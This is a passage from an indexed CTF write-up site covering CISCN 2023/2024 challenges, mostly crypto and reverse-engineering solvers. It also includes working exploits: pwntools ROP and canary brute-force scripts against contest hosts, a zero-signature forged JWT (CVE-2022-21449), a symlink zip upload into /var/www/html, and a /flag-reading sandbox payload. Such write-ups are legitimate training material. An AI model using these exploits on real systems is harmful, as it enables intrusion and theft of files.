1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1]\n\ns = z3.Solver()\nfor i in range(320):\n    rotate()\n    s.add(summary() == bits[i])\n\ns.check()\nmodel = s.model()\nprint(model)\n\narray = [ model[x0].as_long(), model[y0].as_long(), model[z0].as_long() ]\nkey = [ 0 for _ in range(12) ]\nciphertext = [60, 100, 36, 86, 51, 251, 167, 108, 116, 245, 207, 223, 40, 103, 34, 62, 22, 251, 227]\n\nfor i in range(3):\n    for j in range(4):\n        key[i * 4 + j] = (array[i] &gt;&gt; (j * 8)) &amp; 0xFF\n\nfor i in range(len(ciphertext)):\n    ciphertext[i] = ciphertext[i] ^ key[i % 12]\n\nprint(bytes(ciphertext))\n</code></pre>"},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#crypto","title":"Crypto","text":""},{"location":"Writeup/2022%E5%BC%BA%E7%BD%91%E6%9D%AF/readme/#myjwt-crypto-62","title":"myJWT-Crypto-62","text":"<p>\u6ca1\u7ed9\u51fafastjson\u7684\u7248\u672c\uff0c\u7ed3\u5408\u9898\u76ee\u63cf\u8ff0 misc&amp;crypto \u4e14\u662f\u516c\u5171\u73af\u5883\uff0c\u8003\u8651\u5e76\u4e0d\u662f\u6700\u65b0\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u5c31\u53ea\u5269java\u81ea\u5df1\u7684\u5e93\u3002</p> <p>CVE-2022-21449</p> <p>java\u9a8c\u8bc1\uff1a</p> <pre><code>var keys = KeyPairGenerator.getInstance(\"EC\").generateKeyPair();\nvar blankSignature = new byte[64]; // \u9ed8\u8ba4\u662f0\nvar sig = Signature.getInstance(\"SHA256WithECDSAInP1363Format\");\nsig.initVerify(keys.getPublic());\nsig.update(\"admin:False\".getBytes());\nSystem.out.println(sig.verify(blankSignature));\n</code></pre> <p>\u7b7e\u540d\u5168\u662f0\u53ef\u4ee5\u6c38\u8fdc\u901a\u8fc7\u6821\u9a8c\uff0cjwt exp\uff1a <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiZnJhbmsiLCJhZG1pbiI6dHJ1ZSwiZXhwIjoxODU5MjM1NjAwNzYwfQ==.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==</code></p>"},{"location":"Writeup/2023ciscn1/readme/","title":"2023 ciscn WriteUp by HED","text":"<p><code>HED\u662f\u5357\u65b9\u79d1\u6280\u5927\u5b66COMPASS\u5b9e\u9a8c\u5ba4\u7684CTF\u6218\u961f</code> </p> <ul> <li>2023 ciscn WriteUp by HED</li> <li>Crypto<ul> <li>day1 \u57fa\u4e8e\u56fd\u5bc6SM2\u7b97\u6cd5\u7684\u5bc6\u94a5\u5bc6\u6587\u5206\u53d1</li> <li>day1 Sign_in_passwd</li> <li>day2 badkey1</li> <li>day2 bb84</li> </ul> </li> <li>PWN<ul> <li>day1 \u70e7\u70e4\u644a\u513f</li> <li>day2 funcanary</li> </ul> </li> <li>RE<ul> <li>day1 moveAside</li> <li>day2 babyRE</li> </ul> </li> <li>web<ul> <li>day1 unzip</li> <li>day2 dumpit</li> </ul> </li> <li>MISC<ul> <li>day1 \u7b7e\u5230</li> <li>day1 \u88ab\u52a0\u5bc6\u7684\u751f\u4ea7\u6d41\u91cf</li> <li>day2 pyshell</li> <li>day2 \u95ee\u5377</li> </ul> </li> </ul> <p> </p>"},{"location":"Writeup/2023ciscn1/readme/#crypto","title":"Crypto","text":""},{"location":"Writeup/2023ciscn1/readme/#day1-sm2","title":"day1 \u57fa\u4e8e\u56fd\u5bc6SM2\u7b97\u6cd5\u7684\u5bc6\u94a5\u5bc6\u6587\u5206\u53d1","text":"<p>\u867d\u7136\u53ef\u4ee5\u4e00\u6b65\u4e00\u6b65\u8c03\u5e93\u8fdb\u884c\u8ba1\u7b97\uff0c\u4f46\u662f\u7531\u4e8e\u670d\u52a1\u5668\u5bf9 <code>/api/search</code> \u7684\u7ba1\u7406\u4e0d\u662f\u5341\u5206\u5230\u4f4d\uff0c\u4e8e\u662f\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee <code>/api/allkey</code>, <code>/api/quantum</code> \u63a5\u53e3\uff0c\u8ba9\u670d\u52a1\u5668\u751f\u6210\u5bf9\u5e94\u7684\u5bc6\u94a5\uff0c\u7136\u540e\u518d\u8bbf\u95ee <code>/api/search</code> \u5c31\u53ef\u4ee5\u83b7\u5f97\u670d\u52a1\u5668\u5bc6\u94a5\u660e\u6587\uff0c\u7136\u540e <code>/api/check</code> \u4e00\u4e0b\u5373\u53ef\u3002</p> <pre><code>const BASE_URL = 'http://IP:PORT'\n\nasync function post(url, data) {\n    return await fetch(BASE_URL + url, {\n        method: 'POST',\n        headers: { \"Content-Type\": \"application/json\" },\n        body: JSON.stringify(data),\n    })\n}\n\nasync function main() {\n    r = await post('/api/login', {\n        school: '...',\n        name: '...',\n        phone: '...',\n    });\n    id = (await r.json()).data.id;\n\n    const publicKey = '031e92b2d450aa111da2d4cc01a532eb277654d442896bd5e4b66cdfb83ff94dfd';\n\n    r = await post('/api/allkey', { id, publicKey });\n    r = await post('/api/quantum', { id });\n    r = await post('/api/search', { id });  // \u67e5\u8be2\u670d\u52a1\u5668\u91cf\u5b50\u5bc6\u94a5\n    data = await r.json();\n\n    r = await post('/api/check', {\n        id,\n        quantumString: data.data.quantumStringServer,\n    });\n\n    r = await post('/api/search', { id });\n    data = await r.json();\n    console.log(data);  // flag HERE\n}\n\nmain()\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#day1-sign_in_passwd","title":"day1 Sign_in_passwd","text":"<p>base64\u6362\u8868\u7ed9\u8868  </p>"},{"location":"Writeup/2023ciscn1/readme/#day2-badkey1","title":"day2 badkey1","text":"<p>\u7ffb\u9605 PyCryptodome \u6e90\u7801\uff0c\u53d1\u73b0\u552f\u4e00\u53ef\u4ee5\u5229\u7528\u7684\u70b9\u662f\uff1a</p> <pre><code>            if Integer(n).gcd(d) != 1:\n                raise ValueError(\"RSA private exponent is not coprime to modulus\")\n</code></pre> <p>\u9700\u8981\u6784\u9020 d \u662f p \u7684\u500d\u6570\u3002</p> <p>$$ \\begin{align} ed &amp;\\equiv 1 \\pmod{\\varphi(n)} \\ ed &amp;= k(p-1)(q-1)+1 \\ emp &amp;= k(p-1)(q-1)+1 \\ em &amp;\\equiv 1 \\pmod{p-1} \\end{align} $$</p> <p>\u968f\u673a\u751f\u6210 p\uff0c\u6c42\u51fa\u5bf9\u5e94\u7684\u9006\u5143 m\u3002</p> <p>$$ \\begin{align} emp &amp;= k(p-1)(q-1)+1 \\ k(q-1) &amp;= (emp-1)/(p-1) = g \\end{align} $$ \u8ba1\u7b97\u5f97\u5230  g\uff0c\u5b83\u7684\u957f\u5ea6\u5927\u4e8e 512bits\u3002\u5bf9 g \u8fdb\u884c\u56e0\u5f0f\u5206\u89e3\uff0c\u627e\u5230 g \u7684\u5c0f\u56e0\u5b50\uff0c\u679a\u4e3e\u6240\u6709\u53ef\u80fd\u7684\u56e0\u5b50\u7ec4\u5408\u5f97\u5230\u53ef\u80fd\u7684 q\uff0c\u68c0\u67e5 q \u7684\u957f\u5ea6\u4e3a 512bits \u800c\u4e14\u662f\u8d28\u6570\u3002\u6700\u540e\u8fdb\u884c <code>RSA.construct()</code> \u6765\u9a8c\u8bc1\u89e3\u3002</p> <pre><code>from Crypto.Util.number import *\nfrom Crypto.PublicKey import RSA\nfrom functools import reduce\nimport itertools\nimport operator\n\ne = 65537\n\ndef valid(p, q):\n    try:\n        assert p &gt; 0\n        assert q &gt; 0\n        assert p != q\n        assert p.bit_length() == 512\n        assert q.bit_length() == 512\n        assert isPrime(p)\n        assert isPrime(q)\n        n = p * q\n        assert p % e != 1\n        assert q % e != 1\n        d = inverse(e, (p-1)*(q-1))\n    except:\n        print(\"Invalid params\")\n    try:\n        key = RSA.construct([n,e,d,p,q])\n        print(\"This is not a bad RSA keypair.\")\n    except KeyboardInterrupt:\n        print(\"Hacker detected.\")\n    except ValueError:\n        print(\"How could this happen?\")\n        exit()\n\n\ndef get_subsets_product(nums):\n    subsets = itertools.chain.from_iterable(itertools.combinations(nums, r) for r in range(len(nums)+1))\n    products = [reduce(operator.mul, subset, 1) for subset in subsets]\n    return products\n\n\nwhile True:\n    p = getPrime(512)\n    m = inverse(e, p-1)\n    g = (e*m*p-1)//(p-1)\n    print(g)\n\n    f = []\n    for i in range(2, 100000):\n        while g % i == 0:\n            f.append(i)\n            g //= i\n    print(f)\n    print(g.bit_length(), g)\n\n    if g.bit_length() &lt;= 512:\n        products = set(get_subsets_product(f))\n        print(products)\n        for product in products:\n            q = g*product+1\n            if q.bit_length() == 512 and isPrime(q):\n                print(\"m =\", m)\n                print(\"p =\", p)\n                print(\"q =\", q)\n                valid(p, q)\n\n\"\"\"\nm = 739662064870849344381206806184175992877839090213520670251993876722483241877948397023123405984485744758150988206982230375604910547042328474782788374141431\np = 9076059304519912653568835509622232174730376419270455751040052929930983752659633794365182298821427121178607248477999331983901708017508534216783299321495407\nq = 7450850406615563092946687743143612364776351130544651731679207300762585954957747324885404035967605633909459162945126718740550111054643879688263080491255299\n\"\"\"\n\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#day2-bb84","title":"day2 bb84","text":"<p>\u9605\u8bfb\u6750\u6599\u7684\u5927\u610f\u662f\uff1a</p> <pre><code>EPC1    4   2   1   2\nAPD1    0   0   0   0\nAPD2    0   0   0   1\nAPD3    0   0   0   0\nAPD4    0   0   0   0\n</code></pre> <p>APD1 \u5230 4 \u4e2d\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u4e3a 1\uff0c\u5e76\u4e14\u548c EPC1 \u76f8\u7b49\uff0c\u5219\u8fd9\u4f4d\u53ef\u4ee5\u91c7\u7528\u4e3a\u5bc6\u94a5\u3002 \u6216\u8005 APD1 \u5230 4 \u4e2d\u6709\u4e14\u53ea\u6709\u4e00\u4e2a\u4e3a 1\uff0c\u548c EPC1 \u4e0d\u76f8\u7b49\uff0c\u4f46\u662f\u5728\u540c\u4e00\u4e2a\u57fa\uff08\u5982APD1=1\uff0cEPC1=2\uff09\uff0c\u90a3\u4e48\u8fd9\u4f4d\u9700\u8981\u7ea0\u9519\uff0c\u7ea0\u9519\u4e4b\u540e\u53ef\u4ee5\u91c7\u7528\u3002 \u5c06\u6574\u4e2a\u5e8f\u5217\u7b5b\u9009\u4e4b\u540e\u5f97\u5230\u53ef\u7528\u7684\u5e8f\u5217\uff0c\u7136\u540e\u6839\u636e\u7ebf\u6027\u540c\u4f59\u751f\u6210\u771f\u6b63\u7684\u5bc6\u94a5\u3002</p> <p>\u53e6\u5916\u6750\u6599\u4e2d\u63d0\u5230\u4e86\u7528\u71b5\u8ba1\u7b97\u5b89\u5168\u5bc6\u94a5\u91cf\uff0c\u7136\u540e\u628a\u5b83\u4f5c\u4e3a\u6a21\u6570\u3002\u8fd9\u662f\u4e00\u4e2a\u8bef\u5bfc\uff0c\u6211\u5728\u8fd9\u91cc\u5361\u4e86\u5f88\u4e45\u3002\u56e0\u4e3a\u91c7\u7528\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u957f\u5ea6\u663e\u8457\u591a\u4e8e\u8ba1\u7b97\u51fa\u7684\u5b89\u5168\u5bc6\u94a5\u91cf\uff0c\u4e0d\u77e5\u9053\u5982\u4f55\u9009\u51fa\u76f8\u5e94\u7684\u5b89\u5168\u5bc6\u94a5\u3002\u5b9e\u9645\u4e0a\u9898\u76ee\u7684\u505a\u6cd5\u662f\u76f4\u63a5\u628a\u968f\u673a\u6570\u5e8f\u5217\u7684\u957f\u5ea6\u5f53\u4f5c\u5b89\u5168\u5bc6\u94a5\u91cf\uff0c\u4e0d\u9700\u8981\u8ba1\u7b97\u71b5\u3002</p> <p>\u4e4b\u540e\u5c31\u662f\u7ecf\u5178\u7684\u751f\u6210\u6d41\u5bc6\u7801\uff0c\u9010\u4e2a\u5f02\u6216\u3002</p> <pre><code>import csv\n\nwith open('info.csv', 'r') as file:\n    reader = csv.reader(file, delimiter=',')\n    data = list(reader)\n\nkey = []\nerror = 0\n\nfor i in range(1, len(data[0])):\n    pos = []\n    for j in range(1, 5):\n        if data[j][i] == '1':\n            pos.append(j)\n    if len(pos) == 1:\n        ex = int(data[0][i])\n        if pos[0] == ex:\n            key.append((pos[0]+1)%2)\n        elif (pos[0]-1)//2==(ex-1)//2:\n            #key.append(f'x{(ex+1)%2}')\n            key.append((ex+1)%2)\n            error += 1\n\nM = len(key)\n\nl = len(c)//2*8\nA = 1709\nB = 2003\nx = 17\ngen_key = []\nfor i in range(l):\n    s = ''\n    for j in range(8):\n        if type(key[x])==int:\n            s += str(key[x])\n        else:\n            s += key[x][1:]\n        x = (A*x+B)%M\n    gen_key.append(int(s, 2))\n\nhex_values = [int(c[i:i+2], 16) for i in range(0, len(c), 2)]\nfor i in range(len(hex_values)):\n    print(chr(hex_values[i]^gen_key[i]), end='')\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#pwn","title":"PWN","text":""},{"location":"Writeup/2023ciscn1/readme/#day1","title":"day1 \u70e7\u70e4\u644a\u513f","text":"<p>\u9759\u6001\u7f16\u8bd1\u6808\u6ea2\u51fa \u6ca1system\u6ca1exec \u6807\u51c6ORW</p> <pre><code>from pwn import *\n\np = remote(\"123.56.99.60\", 26637)\ne = ELF('shaokao')\n\np.sendlineafter(b'&gt;', b'1\\n1\\n-9999')\np.sendlineafter(b'&gt;', b'4')\np.sendlineafter(b'&gt;', b'5')\ncontext.arch = 'amd64'\nr = ROP(e)\nflag_str = b'/flag\\x00'\nr.call(e.symbols['read'], [0, e.bss() + 100, len(flag_str)])\nr.call(e.symbols['open'], [e.bss() + 100, 0, 0])\nr.call(e.symbols['read'], [3, e.bss() + 100, 100])\nr.call(e.symbols['write'], [1, e.bss() + 100, 0x101])\nr.call(e.symbols['write'], [1, e.bss() + 100, len(flag_str)*9])\np.sendline(b'a' * (0x20 + 8) + r.chain())\np.sendline(flag_str)\n#gdb.attach(p)\np.interactive()\n</code></pre> <p> </p>"},{"location":"Writeup/2023ciscn1/readme/#day2-funcanary","title":"day2 funcanary","text":"<p>\u62a2\u4e00\u8840\u6ca1\u5199\u5faa\u73af\u76f4\u63a5\u5c55\u5f00\u4e86 fork\u7206\u7834canry \u677f\u5b50 \u7136\u540e\u6709ASLR \u6709win \u77ed\u8df3\u7206\u78344bit\u5373\u53ef</p> <pre><code>import struct\n\nfrom pwn import *\n\ncn = remote(\"39.106.48.123\", 27305)\n\ncn.recvuntil(b'welcome\\n')\n\ncanary = b'\\x00'\nfor j in range(7):\n    for i in range(0x100):\n        cn.send(b'a' * 104 + canary + struct.pack('B', i))\n        a = cn.recvuntil(b'welcome\\n')\n        if b'have fu' in a:\n            canary += struct.pack('B', i)\n            print(canary)\n            break\n\nx = 8\ncn.send(b'a' * 104 + canary + b'a' * x + b'\\x31\\x02')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x12')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x22')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x32')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x42')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x52')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x62')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x72')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x82')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\x92')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xa2')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xb2')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xc2')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xd2')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xe2')\ncn.sendafter(b'welcome', b'a' * 104 + canary + b'a' * x + b'\\x31\\xf2')\ncn.recvuntil(b'welcome')\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#re","title":"RE","text":""},{"location":"Writeup/2023ciscn1/readme/#day1-moveaside","title":"day1 moveAside","text":"<p>\u4e00\u5e74\u524d\u505a\u8fc7\u7684\u9898\uff0c\u5f53\u65f6\u6211\u5199\u7684\u7684\u8d85\u7ea7\u8be6\u7ec6\u9898\u89e3\uff1a https://github.com/GhostFrankWu/CS315-ComputerSecurity/blob/main/week5/wp.md  \u7b2c\u4e00\u5929\u7ed3\u675f\u540e\u53d1\u73b0GitHub\u7edf\u8ba1\u8bbf\u5ba250\u591a  </p> <p>\u6838\u5fc3\u5c31\u662f\u53bb\u6df7\u6dc6\u4e4b\u540e\u627e\u5230\u7528\u4f5cjmp\u7684mov\u6307\u4ee4\uff0c\u8fd8\u6709\u5c31\u662f\u8981\u77e5\u9053mov\u6df7\u6dc6\u4f3c\u4e4e\u4e00\u5b9a\u6709\u9010\u5b57\u8282\u6bd4\u8f83\u7684\u5730\u65b9\uff0c\u65ad\u5728\u8fd9\u91cc\u7206\u7834\u5c31\u884c\u4e86  </p> <pre><code>from pwn import *\n\n#            flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxx3861}\nflag = list('flag{781dda4e-d910-*********************}')\nstri = \"0123456789abcdef-ghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\"\n\nsp = b\"LEGEND: \"\ncontext.log_level = 'critical'\n\n\n\nfor i in range(19, 43):\n    for j in range(len(stri)):\n        p = process([\"gdb\", \"fuck\"])\n        p.sendline(b\"b *0x8052A92\")\n        p.sendline(b\"r\")\n        tr = [x for x in flag]\n        tr[i] = stri[j]\n        p.sendline(''.join(tr).encode())\n        _ = p.recvuntil(sp)\n        print(f'No.{i + 1}, trying {stri[j]}, now flag is {\"\".join(flag)}')\n        for c in range(i-1):\n            p.sendline(b'c')\n            _ = p.recvuntil(sp)\n        p.sendline(b'c')\n        r = p.recvall(0.3)\n        if sp in r:\n            print(\"hit!!!!\")\n            flag[i] = stri[j]\n            print(''.join(flag))\n            p.close()\n            break\n        else:\n            p.close()\n\n\nprint(''.join(flag))\n</code></pre> <p>\u70ab\u9177\u7684\u754c\u9762\uff08\u96fe  </p>"},{"location":"Writeup/2023ciscn1/readme/#day2-babyre","title":"day2 babyRE","text":"<p>\u649e\u8f66\u961f\u53cb\uff1a  </p> <p>\u7f51\u4e0a\u968f\u4fbf\u770b\u4e86\u70b9Snap!\u7684\u8d44\u6599\uff0c\u5b9a\u4f4d\u5230flag\u5224\u65ad\u903b\u8f91\uff0c\u6839\u636e<code>secret</code>\u7b80\u5355\u505a\u4e00\u6ce2\u5f02\u6216\u8fd0\u7b97\u8fd8\u539f\u8f93\u5165<code>key</code>\u5373flag</p> <pre><code>secret = [102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25, 81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]\n\nkey = 'f'\n\nfor i in secret[1:]:\n    next_char = chr(ord(key[-1]) ^ i)\n    key += next_char\n\nprint(key)\n\n</code></pre> <pre><code>d = [(92, 1), (92, -1), (8, -1), (28, -1), (20, 1), (25, -1), (75, 1), (81, -1), (83, -1), (0, 1), (7, -1), (28, -1),\n     (85, 1), (76, -1), (88, -1), (4, 3), (9, -1), (7, 1), (0, -1), (29, -1), (73, -1), (1, 1), (0, -1), (3, 2),\n     (86, -1), (4, -1), (74, 1), (87, -1), (3, 2), (87, -1), (82, -1), (28, 1), (84, -1), (85, -1), (6, 1), (4, -1),\n     (85, -1), (13, 1), (87, -1), (10, 1), (102, 1), (30, -1)]\n\nl = []\nfor i in d:\n    print(l)\n    if i[1] != -1:\n        l.insert(i[1] - 1, i[0])\n    else:\n        l.insert(len(l), i[0])\n\nc = 0\nfor i in l:\n    c ^= i\n    print(chr(c), end=\"\")\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#web","title":"web","text":""},{"location":"Writeup/2023ciscn1/readme/#day1-unzip","title":"day1 unzip","text":"<p>\u4ee3\u7801\u957f\u5f97\u548c\u4e0a\u5468\u6625\u79cb\u676f\u7684\u9898\u5b8c\u5168\u4e00\u81f4 \u9898\u76ee\u6ca1\u7ed9Dockerfile\uff0c\u5927\u6982\u4e0d\u662f\u5386\u53f2\u6f0f\u6d1e\uff0c03\u5e74\u4e4b\u540e\u7684zip\u5c31\u4e0d\u80fd\u76ee\u5f55\u7a7f\u8d8a\u4e86       </p> <p>\u521b\u5efa\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u5939\u7684\u8f6f\u94fe ln -s /var/www/html www &amp;&amp; zip -y x.zip www \u7136\u540e\u538b\u7f29\u4e00\u4e2a\u5e26\u4e00\u53e5\u8bdd\u7684www\u6587\u4ef6\u5939\u89e3\u538b\u5c31\u53ef\u4ee5\u4e86  </p>"},{"location":"Writeup/2023ciscn1/readme/#day2-dumpit","title":"day2 dumpit","text":"<p>dump\u548c\u6ce8\u5165\u5206\u5f00 query\u5c4f\u853d\u7684\u5e76\u4e0d\u591a\uff0c\u4f46\u63d0\u793a\u8981\u505a\u5230rce  dump\u51e0\u4e4e\u90fd\u662f\u7528\u547d\u4ee4\u884c\u5de5\u5177\u505a\uff0c\u679c\u7136\u5728dump\u7684\u5730\u65b9\u53ef\u4ee5\u547d\u4ee4\u62fc\u63a5  \u7136\u540e\u53d1\u73b0\u6ca1\u6743\u9650\u8bfbflag \u5f39shell  </p> <p>\u8dd1linpeas\u63d0\u6743\u65f6\u5019\u5728\u73af\u5883\u53d8\u91cf\u91cc\u51fa\u4e86  </p>"},{"location":"Writeup/2023ciscn1/readme/#misc","title":"MISC","text":""},{"location":"Writeup/2023ciscn1/readme/#day1_1","title":"day1 \u7b7e\u5230","text":"<p>python\u4efb\u610f\u4ee3\u7801 \u7b7e\u5230 </p>"},{"location":"Writeup/2023ciscn1/readme/#day1_2","title":"day1 \u88ab\u52a0\u5bc6\u7684\u751f\u4ea7\u6d41\u91cf","text":"<p>\u53d1\u73b0 query \u4e2d\u7684 word count \u4e0d\u7b26\u5408\u5b9a\u4e49\u3002\u4e4b\u524d\u8bf7\u6c42\u4e86\u975e\u5e38\u5927\u7684\u6570\u5b57\uff0c\u540e\u671f\u5168\u90e8\u8bf7\u6c42 5\u3002 \u8ffd\u8e2a TCP \u6d41\u53d1\u73b0\uff0cword count \u521a\u597d\u5f62\u6210\u4e86 ascii \u5b57\u7b26\u3002\u5c06\u5176\u63d0\u53d6\u5e76\u89e3\u7801\u3002 <code>MMYWMX3GNEYWOXZRGAYDA===</code> base32 \u89e3\u7801\u5f97\u5230 <code>c1f_fi1g_1000</code>\u3002</p>"},{"location":"Writeup/2023ciscn1/readme/#day2-pyshell","title":"day2 pyshell","text":"<p>\u867d\u7136\u670d\u52a1\u5668\u7981\u6b62\u4e86\u8d4b\u503c\u64cd\u4f5c\uff0c\u5e76\u4e14\u6bcf\u884c\u7684\u957f\u5ea6\u4e5f\u6709\u9650\u5236 \u5bf9\u4e8e\u7b2c\u4e00\u4e2a\u9650\u5236\uff0c\u53ef\u4ee5\u7528 REPL \u4e2d\u7684 _ \u6765\u83b7\u53d6\u4e0a\u4e00\u6761\u8bed\u53e5\u7684\u503c \u5bf9\u4e8e\u7b2c\u4e8c\u4e2a\u9650\u5236\uff0c\u53ef\u4ee5\u5206\u591a\u884c\u8f93\u5165\uff08\u6b64\u65f6\u6bcf\u8f93\u5165\u4e00\u884c\u90fd\u9700\u8981\u91cd\u65b0 nc \u8fde\u63a5\uff09 \u6240\u4ee5\u6700\u7ec8 payload \u4e3a  </p> <pre><code>'/flag'\nopen(_)\n[I for\nI in \n_]\n</code></pre>"},{"location":"Writeup/2023ciscn1/readme/#day2","title":"day2 \u95ee\u5377","text":"<p>\u95ee\u5377</p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/","title":"CISCN 2024 WriteUp by COMPASS","text":"<p>\u4eca\u5e74frank\u56e0\u4e3a\u79cd\u79cd\u539f\u56e0\u672a\u80fd\u53c2\u52a0\uff0c\u867d\u7136\u6210\u7ee9\u4e0d\u5982\u5f80\u5e74\u4f46\u8fd8\u662f\u633a\u6ee1\u610f\u7684 ~~\u4eca\u5e74py\u7684\u8d8a\u6765\u8d8a\u591a\u4e86\u6211***~~</p> <p></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_1","title":"\u76ee\u5f55","text":"<p>Web\u548cPwn\u90fd\u6ca1\u505a\u51fa\u6765\uff08</p> <ul> <li>Misc</li> <li>\u706b\u9505\u94fe\u89c2\u5149\u6253\u5361 (\u7b7e\u5230)</li> <li>\u795e\u79d8\u6587\u4ef6</li> <li>\u901a\u98ce\u673a</li> <li>Power Trajectory Diagram</li> <li>Crypto</li> <li>\u53e4\u5178\u5bc6\u7801</li> <li>hash</li> <li>\u7528\u6237\u4fe1\u606f\u8bbf\u95ee\u63a7\u5236</li> <li>\u5e73\u53f0\u53ef\u4fe1\u8ba4\u8bc1</li> <li>Reverse</li> <li>asm_re</li> <li>androidso_re</li> <li>whereThel1b</li> </ul>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#misc","title":"Misc","text":""},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_2","title":"\u706b\u9505\u94fe\u89c2\u5149\u6253\u5361","text":"<p>\u6b63\u5e38\u505a\u51e0\u9053\u9898\u96c6\u9f507\u79cd\u98df\u6750\u5373\u53ef</p> <p>flag: <code>flag{y0u_ar3 hotpot_K1ng}</code></p>"},{"location":"Writeup/2024ciscn1/ciscn2024_compass_wp/#_3","title":"\u795e\u79d8\u6587\u4ef6","text":"<p>\u8fd9\u9898\u6709\u70b9\u3002\u3002\u3002</p> <p>Part1: \u70b9\u5f00\u5c5e\u6027\uff0c\u53d1\u73b0\u4e00\u6bb5\u5bc6\u6587<code>QFCfpPQ6ZymuM3gq</code>\u548c\u5bc6\u94a5<code>lanjing</code>\uff0c\u63d0\u793a\u662fBifid\u52a0\u5bc6\u3002</p> <p>Part2: \u7b2c\u4e8c\u9875\u5de6\u4e0a\u89d2\u5c55\u5f00\u4e4b\u540e\uff0c\u70b9\u51fb\u201c\u8fd9\u91cc\u201d\u4f1a\u6253\u5f00\u4e00\u4e2adoc\u6587\u4ef6\uff0c\u540e\u9762\u7684\u6587\u5b57\u88ab\u9690\u85cf\u4e86\uff0c\u4e8e\u662f\u7528Word\u5220\u9664\u6587\u5b57\u683c\u5f0f\u8fd8\u539f\uff0c\u5f97\u5230\u5bc6\u6587<code>mQPinNS6Xtm1JGJs</code>\u3002\u6587\u5b57\u63d0\u793aCaeser\uff0c\u5373\u7528ROT\u89e3\u5bc6\uff0ckey\u4e3a16\u3002</p> <p>Part3: \u6253\u5f00ppt\u7684\u65f6\u5019\u63d0\u793a\u6709\u5b8f\uff0c\u6253\u5f00VB\u811a\u672c\uff0c\u9605\u8bfb\u811a\u672c\u53ef\u77e5\u662fRC4\u52a0\u5bc6\uff0c\u65e0\u5bc6\u94a5\uff0cbase64\u89e3\u7801RC4\u89e3\u7801\u518dbase64\u89e3\u7801</p> <p>Part4: \u7b2c\u4e09\u9875\u8367\u5149\u7b14\u624b\u5199\u7684\u5bc6\u6587<code>UGF5dDQ6NmYtNDA=</code>\u662fbase64</p> <p>Part5: 